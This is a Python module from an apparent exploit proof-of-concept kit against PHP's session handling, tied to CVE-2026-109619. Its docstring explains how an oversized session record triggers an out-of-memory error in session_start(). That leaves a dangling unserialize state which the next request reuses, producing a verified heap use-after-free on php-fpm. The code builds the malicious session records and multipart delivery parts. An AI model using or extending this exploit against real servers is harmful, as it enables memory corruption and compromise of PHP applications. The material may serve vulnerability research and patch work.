#!/usr/bin/env python3
# INDEX: session_start()-decode-OOM BG(unserialize) dangle arm, fpm-survivable, no explicit unserialize() | fpm apache cli | ordinary session_start()+$_SESSION write
"""session_start()-decode-OOM BG(unserialize) dangle arm (CVE-2026-109619).

The sink-free sibling of script_unserialize_oom_arm.py: it leaves the IDENTICAL
dangle with NO explicit unserialize() call in the app anywhere. The app does only
an ordinary `session_start()` (plus an ordinary `$_SESSION` write as the delivery
line) - operations found in a large fraction of real apps.

Mechanism (VERIFIED-IN-CODE, php-8.5.11 ext/session/session.c + var_unserializer.c):
  session_start() -> php_session_initialize -> php_session_decode ->
  PS(serializer)->decode -> php_var_unserialize over the SAME global BG(unserialize)
  the userland unserialize() uses (php_var_unserialize_init/destroy, var_unserializer.c
  :61-94). An oversized/amplifying session record OOMs mid-php_var_unserialize, so the
  PHP_VAR_UNSERIALIZE_DESTROY is skipped and BG(unserialize) is left {data=d, level=1}.
  php_session_decode wraps decode in its OWN zend_try/zend_catch that runs
  php_session_cancel_decode() (which does NOT touch BG(unserialize)) and then RE-RAISES
  zend_bailout(); because session_start() runs mid-script inside zend_execute, the
  re-raised bailout is caught by the SAPI's php_execute_script zend_first_try -> the
  worker SURVIVES (unlike session_decode_dangle.py's pre-RINIT upload_progress arm,
  which exit-70s on fpm). PHP_RINIT(basic) (basic_functions.c) memsets BG(unserialize)
  only at the START of a request, RSHUTDOWN never touches it, so the dangle survives
  idle and is reused by the NEXT request's PRE-RINIT upload_progress session decode.

VERIFIED EMPIRICAL:
  - fpm (php:8.4.26-fpm behind nginx, profile a7r5, pm=static/1/128M,
    fresh-container-per-trial, black-box): sess_arm.php = `session_start(); if(isset
    ($_POST['x'])) $_SESSION['x']=$_POST['x'];`. Seed SID's record = session_record()
    (the `php` handler's `x|<amplifier>`), GET /sess_arm.php with that SID ->
    worker PID stable across the OOM AND OOMed: 6/6 survived, 6/6 OOMed. Pad-free
    (no producer.php-style memory crutch). See verify_session_start_oom_arm.py.
  - ASAN `php -S` 8.4.26 @128M (cli-asan-128): the session_start()-OOM arm leaves a
    reusable dangle; the existing upload_progress consumer (session_decode_dangle.
    consumer_body) reuses it -> heap-use-after-free READ at var_unserializer.re:166
    (tmp_var <- var_tmp_var <- ps_srlzr_decode_php session.c:1134 <- php_session_decode
    <- php_session_rfc1867_update). Same UAF site as the explicit arm.

Delivery: the arm needs the attacker's OWN session file to contain a record whose
decode OOMs. The default `php` serializer stores `key|serialized_value`; an app line
as mundane as `$_SESSION['x']=$_POST['x']` controls the stored value. A PLAIN SCALAR
write re-serializes to `x|s:N:"...";` (one string alloc) - to OOM a finite limit it
must be ~memory_limit-sized (the heavy single-huge-string model, cf. lab/app/unser.php;
free of the nesting/input-var caps). The small-input self-amplifier (session_record()
below, reusing script_unserialize_oom_arm's nested-array / huge-array-init payloads)
OOMs deterministically at 128M from a few MB, but needs the RAW serialized bytes in the
file verbatim (a bounded `x[..]` POST array is capped by max_input_nesting_level/
max_input_vars). The MECHANISM (survive + reusable dangle) is delivery-independent;
getting the shaped bytes into the file is the remaining per-app constraint.

Builders are payload/record shapers for common.multipart and the session file; no
network. Needs a finite memory_limit (immune at -1). Pure stdlib; safe under -I.
"""
from __future__ import annotations

import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)

# DRY: reuse the explicit-arm's OOM payloads verbatim. The session `php` serializer
# feeds the bytes after the first '|' straight into php_var_unserialize, so the exact
# same blobs that OOM unserialize() OOM a session decode.
from primitives.groom.script_unserialize_oom_arm import (  # noqa: E402
    oom_payload, prealloc_payload, cochunk_payload,
)

# Default session key for the mundane `$_SESSION['x']=...` delivery line.
SESSION_KEY = b"x"


def session_record(payload: bytes | None = None, key: bytes = SESSION_KEY) -> bytes:
    """A `php`-handler session file record whose decode OOMs mid-php_var_unserialize.
    Format is `<key>|<serialized_value>` (PS_DELIMITER '|'); the value is the amplifier
    from script_unserialize_oom_arm (nested-array by default). This is the exact bytes
    an attacker needs in /<save_path>/sess_<SID>."""
    if payload is None:
        payload = oom_payload()
    return key + b"|" + payload


def hugestring_record(nbytes: int, key: bytes = SESSION_KEY) -> bytes:
    """The cap-free single-huge-string record: `<key>|s:N:"AA-..";`. Decoding allocates
    one zend_string of N bytes, so it OOMs only when N approaches the remaining budget
    (the mundane `$_SESSION['x']=<~memory_limit-sized value>` delivery, cf. unser.php).
    No nesting/input-var dependence."""
    return b"%s|s:%d:\"%s\";" % (key, nbytes, b"A" * nbytes)


def delivery_parts(value: bytes):
    """multipart part-tuples for the mundane delivery line `$_SESSION['x']=$_POST['x']`:
    one field `x` carrying the value the app stores into the session. (PHP re-serializes
    a scalar as `x|s:LEN:"..";` - see the module docstring on what that can OOM.)"""
    from common.multipart import part_tuple
    return [part_tuple(SESSION_KEY.decode(), value)]


if __name__ == "__main__":  # smoke test (no network)
    rec = session_record()
    print(f"session_record (amplifier): {len(rec)} bytes, head={rec[:24]!r}")
    print(f"session_record (prealloc) : {len(session_record(prealloc_payload()))} bytes")
    print(f"hugestring_record(1<<20)  : {len(hugestring_record(1 << 20))} bytes")
    print(f"delivery_parts            : {len(delivery_parts(b'draft...'))} part(s)")
